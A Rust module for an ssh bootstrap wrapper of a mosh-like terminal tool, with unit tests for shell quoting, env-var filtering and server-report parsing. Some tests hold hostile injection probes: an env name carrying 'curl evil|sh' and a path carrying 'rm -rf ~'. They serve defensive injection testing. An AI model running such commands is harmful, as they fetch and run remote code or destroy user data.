//! ssh bootstrap wrapper (mosh.pl port, simplified): run `posh server new`
//! on the remote host over ssh, parse the POSH IP / POSH CONNECT lines,
//! then run the UDP client locally with the key in the environment.

use std::io::{BufRead, BufReader};
use std::process::{Command, Stdio};

use crate::remote::datagram::Family;
use crate::util::{Error, Result};

pub struct SshOptions {
    pub family: Family,
    /// Server-side UDP port range, already validated ("P" or "P1:P2").
    pub port_range: Option<String>,
    /// SSH agent forwarding (FDR 0004): the resolved local agent socket the
    /// client proxy dials, or `None` when forwarding is off. `Some` is the
    /// single source of truth — `remote_command` appends `-A` to
    /// `posh-server new` exactly when this is set (C4: the bootstrap carries
    /// the outcome; the path itself stays client-side, never on the wire).
    pub agent_source: Option<std::path::PathBuf>,
    /// Real OpenSSH `-a`/`-A` to pass through to the bootstrap `ssh` process
    /// itself (FDR 0004 §Limitations: "`posh ssh` stays a thin ssh wrapper").
    /// `Some(true)` = `-A`, `Some(false)` = `-a`, `None` = say nothing, let
    /// ssh use its own default/config. Orthogonal to `agent_source`, which is
    /// posh's own transport-level forwarding to the roaming session.
    pub real_ssh_agent_forward: Option<bool>,
}

/// What the wrapped server reported on stdout.
#[derive(Debug, Default, PartialEq, Eq)]
pub struct ServerReport {
    pub ip: Option<String>,
    pub port: Option<u16>,
    pub key: Option<String>,
}

impl ServerReport {
    /// Feeds one line of server output; returns false for lines that are
    /// not part of the protocol (motd etc., to be passed through), true
    /// once the CONNECT line arrived (parsing is finished).
    pub fn feed(&mut self, line: &str) -> Result<bool> {
        if let Some(rest) = line.strip_prefix("POSH IP ") {
            let ip = rest.trim();
            if ip.is_empty() || ip.contains(char::is_whitespace) {
                return Err(Error(format!("bad POSH IP string: {line}")));
            }
            self.ip = Some(ip.to_string());
            return Ok(false);
        }
        if let Some(rest) = line.strip_prefix("POSH CONNECT ") {
            let (port, key) = parse_connect(rest)
                .ok_or_else(|| Error(format!("bad POSH CONNECT string: {line}")))?;
            self.port = Some(port);
            self.key = Some(key);
            return Ok(true);
        }
        Ok(false)
    }
}

/// Builds the remote command: locale variables forwarded as POSIX-sh
/// environment prefixes (LANG/LC_*, so the server sees the client's charset),
/// then `posh-server new [-A] [-4|-6] [-p R]`, then the caller-supplied server
/// `tail` appended verbatim — mosh (`mosh-server new`) parity; the package
/// installs posh-server as an alias of posh.
///
/// The caller OWNS the tail shape (RFC 0008 §3), so one function serves every
/// bootstrap: legacy `-- posh [-g G] attach SESSION [cmd...]`, single-model
/// `relay [-g G] SESSION [-- cmd...]`, or the bare-host `[-- cmd...]`. Each tail
/// token is shell-quoted for a lossless argv (a session name or command word
/// with spaces survives the remote shell) EXCEPT a bare `--`, which is emitted
/// unquoted so the legacy wire string stays byte-identical to the pre-relay
/// bootstrap. (`--` means the same argument quoted or not, so this is cosmetic
/// for the relay tail and load-bearing only for legacy byte-identity.)
/// The remote server executable in the bootstrap command: the packaged
/// `posh-server` from the remote's non-interactive PATH by default, or — when
/// `POSH_SERVER_CMD` names one — that binary, shell-quoted (#119). The
/// override is the one operator-supplied string in the bootstrap; quoting it
/// like every other interpolation makes a path with spaces work and renders
/// shell metacharacters inert on the remote. It is a single executable path,
/// not a command line. The default stays unquoted so the baseline wire string
/// remains byte-identical to the pre-override bootstrap.
fn server_command_head(override_cmd: Option<&str>) -> String {
    match override_cmd.filter(|s| !s.is_empty()) {
        Some(bin) => shell_quote(bin),
        None => "posh-server".to_string(),
    }
}

pub fn remote_command(
    opts: &SshOptions,
    tail: &[String],
    locale_vars: &[(String, String)],
) -> String {
    let mut cmd = String::new();
    for (name, value) in locale_vars {
        cmd.push_str(name);
        cmd.push('=');
        cmd.push_str(&shell_quote(value));
        cmd.push(' ');
    }
    cmd.push_str(&server_command_head(
        std::env::var("POSH_SERVER_CMD").ok().as_deref(),
    ));
    cmd.push_str(" new");
    // C4: the bootstrap carries only the outcome (forward or not), never the
    // source path — that lives client-side. A bare `-A` to posh-server.
    if opts.agent_source.is_some() {
        cmd.push_str(" -A");
    }
    match opts.family {
        Family::Inet => cmd.push_str(" -4"),
        Family::Inet6 => cmd.push_str(" -6"),
        Family::Auto => {}
    }
    if let Some(range) = &opts.port_range {
        cmd.push_str(" -p ");
        cmd.push_str(range);
    }
    for arg in tail {
        cmd.push(' ');
        if arg == "--" {
            cmd.push_str("--");
        } else {
            cmd.push_str(&shell_quote(arg));
        }
    }
    cmd
}

/// True for an env-var name safe to splice into a POSIX-sh assignment: only
/// `[A-Za-z_][A-Za-z0-9_]*`. Anything else (the kernel permits arbitrary
/// bytes except `=`/NUL in names) would break — or inject into — the remote
/// command string, since the name is emitted unquoted. github #6.
fn is_shell_safe_name(name: &str) -> bool {
    let mut chars = name.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Environment the remote `posh-server` should see: LANG + every LC_*
/// (charset, mosh parity); TERM and COLORTERM (posh#51 — so the session shell
/// isn't left with an empty TERM, which strands color-by-$TERM tools like git
/// and Charmbracelet TUIs); and POSH_DEBUG_LOG, so a single locally-set perf-log
/// path lights up both ends (the server logs to that path on the *remote* host,
/// failing closed if it isn't writable there); and POSH_ESCAPE_CMD, so the
/// escape-to-shell command (FDR 0008) is set once on the client and runs on the
/// *remote* server. TERM rides as a *candidate*: the
/// server resolves it against its own terminfo DB (terminfo::resolve_term).
/// Restricted to names safe to emit as shell assignments.
///
/// Contract: `terminfo::session_env` (server side) reads TERM and COLORTERM
/// back out of `posh-server`'s process env, which is *only* populated because
/// they're in this filter. Dropping COLORTERM here silently regresses remote
/// truecolor (TERM degrades gracefully via resolve_term; COLORTERM has no
/// fallback). Keep the two sides in sync. POSH_KEY is deliberately excluded —
/// the session key never travels in the cleartext remote command string.
fn forwarded_env_vars() -> Vec<(String, String)> {
    std::env::vars()
        .filter(|(k, _)| {
            (k == "LANG"
                || k.starts_with("LC_")
                || k == "TERM"
                || k == "COLORTERM"
                || k == "POSH_DEBUG_LOG"
                || k == "POSH_ESCAPE_CMD")
                && is_shell_safe_name(k)
        })
        .collect()
}

pub fn run(target: &str, remote_cmd: &[String], opts: &SshOptions) -> Result<()> {
    let server_cmd = remote_command(opts, remote_cmd, &forwarded_env_vars());

    let mut ssh = Command::new("ssh");
    match opts.family {
        Family::Inet => {
            ssh.arg("-4");
        }
        Family::Inet6 => {
            ssh.arg("-6");
        }
        Family::Auto => {}
    }
    match opts.real_ssh_agent_forward {
        Some(true) => {
            ssh.arg("-A");
        }
        Some(false) => {
            ssh.arg("-a");
        }
        None => {}
    }
    let mut child = ssh
        .arg(target)
        .arg("--")
        .arg(&server_cmd)
        .stdin(Stdio::inherit()) // keep the tty for auth prompts
        .stdout(Stdio::piped())
        .stderr(Stdio::inherit())
        .spawn()
        .map_err(|e| Error(format!("cannot exec ssh: {e}")))?;

    let stdout = child.stdout.take().expect("piped stdout");
    let mut report = ServerReport::default();
    for line in BufReader::new(stdout).lines() {
        let line = line?;
        if report.feed(&line)? {
            break;
        }
        if !line.starts_with("POSH ") {
            // Pass through motd and friends.
            println!("{line}");
        }
    }
    let _ = child.wait();

    let (Some(port), Some(key)) = (report.port, report.key) else {
        return Err(Error::from(
            "did not find posh server startup message \
             (is posh-server on the server's non-interactive PATH?)",
        ));
    };

    // Prefer the address the server reported (third field of its
    // $SSH_CONNECTION: the IP we actually reached it on); fall back to
    // resolving the hostname we dialed, as mosh.pl does.
    let fallback = target.rsplit('@').next().unwrap_or(target).to_string();
    let host = report.ip.unwrap_or(fallback);
    std::env::set_var("POSH_KEY", key);
    crate::remote::client::run(&host, port, opts.family, opts.agent_source.clone())
}

/// #67: create-or-ensure a DETACHED session on the remote host and return,
/// without standing up the roaming transport. Unlike [`run`], this execs the
/// inner posh command directly over ssh (no `posh-server new`, no UDP
/// client): `inner` is `posh [-g GROUP] attach SESSION --detach [command...]`,
/// which double-forks a session daemon on the host and exits. A later
/// foreground `posh host:group/session` attaches to that same daemon session
/// through a fresh, disposable transport pair. Agent forwarding (FDR 0004)
/// rides that later foreground connection, not the spawn — so no `-A` here.
pub fn run_detached(target: &str, inner: &[String], opts: &SshOptions) -> Result<()> {
    let remote_cmd = detached_command(inner, &forwarded_env_vars());

    let mut ssh = Command::new("ssh");
    match opts.family {
        Family::Inet => {
            ssh.arg("-4");
        }
        Family::Inet6 => {
            ssh.arg("-6");
        }
        Family::Auto => {}
    }
    let status = ssh
        .arg(target)
        .arg("--")
        .arg(&remote_cmd)
        .stdin(Stdio::inherit()) // keep the tty for auth prompts
        .stdout(Stdio::inherit()) // pass through `posh attach --detach`'s status line
        .stderr(Stdio::inherit())
        .status()
        .map_err(|e| Error(format!("cannot exec ssh: {e}")))?;
    if !status.success() {
        return Err(Error(format!("remote detached spawn failed on {target}")));
    }
    Ok(())
}

/// Builds the remote command for a detached spawn (#67): locale/TERM env
/// prefixes (the same forwarding the foreground bootstrap applies), then the
/// inner `posh ... attach ... --detach ...` argv, each element shell-quoted so
/// a command with spaces survives the remote shell intact.
fn detached_command(inner: &[String], env_vars: &[(String, String)]) -> String {
    let mut cmd = String::new();
    for (name, value) in env_vars {
        cmd.push_str(name);
        cmd.push('=');
        cmd.push_str(&shell_quote(value));
        cmd.push(' ');
    }
    for (i, arg) in inner.iter().enumerate() {
        if i > 0 {
            cmd.push(' ');
        }
        cmd.push_str(&shell_quote(arg));
    }
    cmd
}

fn parse_connect(rest: &str) -> Option<(u16, String)> {
    let mut words = rest.split_whitespace();
    let port: u16 = words.next()?.parse().ok()?;
    let key = words.next()?;
    if key.len() != 22 || words.next().is_some() {
        return None;
    }
    Some((port, key.to_string()))
}

fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_connect_line() {
        assert_eq!(
            parse_connect("60001 AAAAAAAAAAAAAAAAAAAAAA"),
            Some((60001, "AAAAAAAAAAAAAAAAAAAAAA".to_string()))
        );
        assert_eq!(parse_connect("60001 shortkey"), None);
        assert_eq!(parse_connect("notaport AAAAAAAAAAAAAAAAAAAAAA"), None);
        assert_eq!(parse_connect("60001 AAAAAAAAAAAAAAAAAAAAAA extra"), None);
    }

    #[test]
    fn shell_quote_escapes_single_quotes() {
        assert_eq!(shell_quote("plain"), "'plain'");
        assert_eq!(shell_quote("it's"), "'it'\\''s'");
    }

    #[test]
    fn only_well_formed_env_names_are_forwarded() {
        assert!(is_shell_safe_name("LANG"));
        assert!(is_shell_safe_name("LC_CTYPE"));
        assert!(is_shell_safe_name("_x9"));
        assert!(!is_shell_safe_name("")); // empty
        assert!(!is_shell_safe_name("9LC")); // leading digit
        assert!(!is_shell_safe_name("LC_X;curl evil|sh;")); // metacharacters
        assert!(!is_shell_safe_name("LC X")); // space
    }

    #[test]
    fn server_report_prefers_posh_ip() {
        let mut report = ServerReport::default();
        assert!(!report.feed("Welcome to examplehost!").unwrap());
        assert!(!report.feed("POSH IP 192.0.2.7").unwrap());
        assert!(
            report
                .feed("POSH CONNECT 60001 AAAAAAAAAAAAAAAAAAAAAA")
                .unwrap()
        );
        assert_eq!(report.ip.as_deref(), Some("192.0.2.7"));
        assert_eq!(report.port, Some(60001));
        assert_eq!(report.key.as_deref(), Some("AAAAAAAAAAAAAAAAAAAAAA"));
    }

    #[test]
    fn server_report_without_ip_line() {
        let mut report = ServerReport::default();
        assert!(report
            .feed("POSH CONNECT 60044 AAAAAAAAAAAAAAAAAAAAAA")
            .unwrap());
        assert_eq!(report.ip, None);
        assert_eq!(report.port, Some(60044));
    }

    #[test]
    fn server_report_rejects_garbage() {
        let mut report = ServerReport::default();
        assert!(report.feed("POSH CONNECT nope nope").is_err());
        assert!(report.feed("POSH IP ").is_err());
        assert!(report.feed("POSH IP two words").is_err());
    }

    #[test]
    fn remote_session_attach_composition_quotes_inner_argv() {
        // RFC 0001 §2: `posh host:grp/my dev` rides as the server's
        // command, every element shell-quoted (lossless argv, as in fork).
        let opts = SshOptions {
            family: Family::Auto,
            port_range: None,
            agent_source: None,
            real_ssh_agent_forward: None,
        };
        // New contract (RFC 0008 §3): the caller owns the `--`; the legacy tail
        // leads with it, then the shell-quoted inner argv. Byte-identical output.
        let inner: Vec<String> = ["--", "posh", "-g", "grp", "attach", "my dev"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let cmd = remote_command(&opts, &inner, &[]);
        assert_eq!(
            cmd,
            "posh-server new -- 'posh' '-g' 'grp' 'attach' 'my dev'"
        );
    }

    #[test]
    fn detached_command_quotes_inner_and_prefixes_env() {
        // #67: a detached remote spawn execs `posh ... attach ... --detach
        // ...` directly (no `posh-server new`), every argv element shell-
        // quoted, with locale/TERM env prefixes like the foreground bootstrap.
        let inner: Vec<String> = [
            "posh", "-g", "spinclass", "attach", "id 7", "--detach", "my worker",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect();
        let env = vec![("LANG".to_string(), "en_US.UTF-8".to_string())];
        assert_eq!(
            detached_command(&inner, &env),
            "LANG='en_US.UTF-8' 'posh' '-g' 'spinclass' 'attach' 'id 7' '--detach' 'my worker'"
        );

        // No env prefixes, no create-command.
        let bare: Vec<String> = ["posh", "attach", "w", "--detach"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        assert_eq!(detached_command(&bare, &[]), "'posh' 'attach' 'w' '--detach'");
    }

    #[test]
    fn remote_command_includes_flags_and_locale() {
        let opts = SshOptions {
            family: Family::Inet6,
            port_range: Some("60100:60200".to_string()),
            agent_source: None,
            real_ssh_agent_forward: None,
        };
        let locale = vec![("LANG".to_string(), "en_US.UTF-8".to_string())];
        // The bare-host tail now carries its own leading `--` (caller-owned).
        let cmd = remote_command(
            &opts,
            &["--".to_string(), "htop".to_string(), "-d".to_string()],
            &locale,
        );
        assert_eq!(
            cmd,
            "LANG='en_US.UTF-8' posh-server new -6 -p 60100:60200 -- 'htop' '-d'"
        );

        let plain = remote_command(
            &SshOptions {
                family: Family::Auto,
                port_range: None,
                agent_source: None,
                real_ssh_agent_forward: None,
            },
            &[],
            &[],
        );
        assert_eq!(plain, "posh-server new");
    }

    #[test]
    fn remote_command_relay_tail() {
        // RFC 0008 §3: the single-model relay bootstrap. The `relay` verb, its
        // `-g GROUP SESSION`, then `-- cmd`. Tokens are shell-quoted for a
        // lossless argv (a spaced session name survives); the `--` stays
        // unquoted, like legacy. The relay CREATES via connect_or_create, so the
        // command rides after the relay's own `--` (no inner `attach`).
        let opts = SshOptions {
            family: Family::Auto,
            port_range: None,
            agent_source: None,
            real_ssh_agent_forward: None,
        };
        let tail: Vec<String> = ["relay", "-g", "grp", "dev", "--", "htop"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        assert_eq!(
            remote_command(&opts, &tail, &[]),
            "posh-server new 'relay' '-g' 'grp' 'dev' -- 'htop'"
        );
    }

    #[test]
    fn remote_command_relay_no_group_no_command() {
        // Default group ⇒ no `-g`; no create-command ⇒ no `--` tail.
        let opts = SshOptions {
            family: Family::Auto,
            port_range: None,
            agent_source: None,
            real_ssh_agent_forward: None,
        };
        let tail: Vec<String> = ["relay", "dev"].iter().map(|s| s.to_string()).collect();
        assert_eq!(remote_command(&opts, &tail, &[]), "posh-server new 'relay' 'dev'");
    }

    #[test]
    fn remote_command_relay_appends_dash_a_before_the_tail() {
        // -A rides right after `new`, before the relay tail — exactly as it does
        // before the legacy tail; the source path never hits the wire (C4).
        let opts = SshOptions {
            family: Family::Inet,
            port_range: Some("60001:60999".to_string()),
            agent_source: Some("/run/user/1000/agent.sock".into()),
            real_ssh_agent_forward: None,
        };
        let tail: Vec<String> = ["relay", "-g", "grp", "dev"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let cmd = remote_command(&opts, &tail, &[]);
        assert_eq!(
            cmd,
            "posh-server new -A -4 -p 60001:60999 'relay' '-g' 'grp' 'dev'"
        );
        assert!(!cmd.contains("agent.sock"), "source path must not hit the wire");
    }

    #[test]
    fn remote_command_appends_dash_a_when_forwarding() {
        // FDR 0004 C4: a bare `-A` rides to posh-server exactly when forwarding
        // resolved on, positioned right after `new` (before -4/-6/-p). The
        // source path never appears — it stays client-side.
        let opts = SshOptions {
            family: Family::Inet,
            port_range: Some("60001:60999".to_string()),
            agent_source: Some("/run/user/1000/agent.sock".into()),
            real_ssh_agent_forward: None,
        };
        let cmd = remote_command(&opts, &[], &[]);
        assert_eq!(cmd, "posh-server new -A -4 -p 60001:60999");
        assert!(!cmd.contains("agent.sock"), "source path must not hit the wire");

        // Off => no -A.
        let off = SshOptions {
            family: Family::Auto,
            port_range: None,
            agent_source: None,
            real_ssh_agent_forward: None,
        };
        assert_eq!(remote_command(&off, &[], &[]), "posh-server new");
    }

    #[test]
    fn server_command_head_quotes_the_override_only() {
        // #119: the override is the one operator-supplied string in the
        // bootstrap — quoted, so a path with spaces survives and shell
        // metacharacters are inert on the remote. The default stays bare for
        // baseline wire byte-identity.
        assert_eq!(server_command_head(None), "posh-server");
        assert_eq!(server_command_head(Some("")), "posh-server");
        assert_eq!(
            server_command_head(Some("/nix/store/abc-posh/bin/posh-server")),
            "'/nix/store/abc-posh/bin/posh-server'"
        );
        let q = server_command_head(Some("/tmp/my build/posh-server; rm -rf ~"));
        assert!(
            q.starts_with('\'') && q.ends_with('\''),
            "metacharacters must ride inside quotes: {q}"
        );
    }

    #[test]
    fn remote_command_forwards_term_and_colorterm_as_prefixes() {
        // posh#51: TERM/COLORTERM ride the same env-prefix path as LANG, so the
        // session shell isn't stranded with an empty TERM. Values are shell-
        // quoted; the server resolves TERM against its own terminfo DB.
        let opts = SshOptions {
            family: Family::Auto,
            port_range: None,
            agent_source: None,
            real_ssh_agent_forward: None,
        };
        let env = vec![
            ("TERM".to_string(), "xterm-kitty".to_string()),
            ("COLORTERM".to_string(), "truecolor".to_string()),
        ];
        let cmd = remote_command(&opts, &[], &env);
        assert_eq!(
            cmd,
            "TERM='xterm-kitty' COLORTERM='truecolor' posh-server new"
        );
    }

    #[test]
    fn forwarded_var_filter_admits_locale_term_debug_log_and_escape_cmd() {
        // The membership predicate forwarded_env_vars applies, tested directly
        // (not via process env, which is global and racy under parallel tests).
        let admit = |k: &str| {
            (k == "LANG"
                || k.starts_with("LC_")
                || k == "TERM"
                || k == "COLORTERM"
                || k == "POSH_DEBUG_LOG"
                || k == "POSH_ESCAPE_CMD")
                && is_shell_safe_name(k)
        };
        assert!(admit("TERM"));
        assert!(admit("COLORTERM"));
        assert!(admit("LANG"));
        assert!(admit("LC_ALL"));
        assert!(admit("POSH_DEBUG_LOG"));
        // The escape-to-shell command rides to the remote server (FDR 0008).
        assert!(admit("POSH_ESCAPE_CMD"));
        assert!(!admit("PATH"));
        // The trigger KEY is client-side only — it must not be forwarded.
        assert!(!admit("POSH_ESCAPE_KEY"));
        // The session key must never ride the cleartext remote command.
        assert!(!admit("POSH_KEY"));
    }
}
